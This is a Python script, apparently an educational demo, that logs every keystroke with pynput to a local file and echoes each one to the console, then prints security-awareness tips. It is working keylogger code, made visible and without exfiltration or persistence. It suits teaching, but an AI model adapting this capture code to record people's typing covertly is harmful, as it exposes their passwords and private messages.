
# Imports
import sys
import os
from datetime import datetime
from pynput import keyboard

LOG_FILE = "keylog_demo.txt"

# Track state for readable output
pressed_keys = []
current_line = ""


def format_key(key):
    """Convert a pynput key object to a readable string."""
    try:
        # Regular character key
        return key.char
    except AttributeError:
        # Special key — map to readable labels
        special = {
            keyboard.Key.space:     " ",
            keyboard.Key.enter:     "\n[ENTER]\n",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab:       "[TAB]",
            keyboard.Key.shift:     "[SHIFT]",
            keyboard.Key.shift_r:   "[SHIFT]",
            keyboard.Key.ctrl_l:    "[CTRL]",
            keyboard.Key.ctrl_r:    "[CTRL]",
            keyboard.Key.alt_l:     "[ALT]",
            keyboard.Key.alt_r:     "[ALT]",
            keyboard.Key.caps_lock: "[CAPS LOCK]",
            keyboard.Key.delete:    "[DELETE]",
            keyboard.Key.esc:       "[ESC]",
            keyboard.Key.up:        "[UP]",
            keyboard.Key.down:      "[DOWN]",
            keyboard.Key.left:      "[LEFT]",
            keyboard.Key.right:     "[RIGHT]",
        }
        return special.get(key, f"[{key.name.upper()}]")


def on_press(key):
    """Called every time a key is pressed."""
    global current_line

    # ESC exits the demo
    if key == keyboard.Key.esc:
        print("\n\n[DEMO ENDED] ESC pressed. Listener stopped.")
        write_log("[SESSION ENDED]\n")
        return False  # Returning False stops the listener

    key_str = format_key(key)
    if key_str is None:
        return

    # Accumulate into current line for console display
    current_line += key_str

    # Write each keystroke to the log file immediately
    write_log(key_str)

    # Print live to console so the demo is transparent
    print(f"  KEY CAPTURED: {repr(key_str)}", flush=True)

    # Show the accumulated line when Enter is pressed
    if key == keyboard.Key.enter:
        print(f"\n  >> Logged line: {repr(current_line.strip())}\n")
        current_line = ""


def write_log(text):
    """Append text to the log file."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)


def main():
    print("=" * 60)
    print("  EDUCATIONAL KEYLOGGER DEMO")
    print("=" * 60)
    print(f"  Logging keystrokes to: {os.path.abspath(LOG_FILE)}")
    print(f"  Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("  Press ESC to stop.\n")
    print("  >>> START TYPING — keystrokes will appear below <<<\n")

    write_log(f"\n--- Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

    # Start listening. This blocks until the listener is stopped.
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    print(f"\n  Log saved to: {os.path.abspath(LOG_FILE)}")
    print("\nKEY TAKEAWAYS (security awareness):")
    print("  1. A real keylogger does this silently — you would see NOTHING.")
    print("  2. Everything you type (passwords, messages) can be captured.")
    print("  3. Malware adds itself to startup so it survives reboots.")
    print("  4. Data is typically encrypted and sent to an attacker's server.")
    print("  5. Defence: use a password manager, keep AV up to date,")
    print("     don't run untrusted executables, use 2FA wherever possible.")


if __name__ == "__main__":
    main()
